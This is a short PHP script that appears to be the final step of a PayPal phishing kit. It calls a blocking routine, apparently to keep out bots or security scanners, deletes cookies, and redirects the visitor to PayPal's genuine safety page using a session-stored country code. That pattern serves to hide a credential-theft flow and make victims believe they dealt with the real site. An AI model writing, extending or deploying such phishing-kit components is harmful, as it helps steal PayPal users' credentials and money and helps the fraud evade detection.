<?php
require_once __DIR__ . '/function.php';

$api->ngeblock();
$api->delete_cookie();
$api->redirect("https://www.paypal.com/{$_SESSION['code']}/webapps/mpp/paypal-safety-and-security");
?>
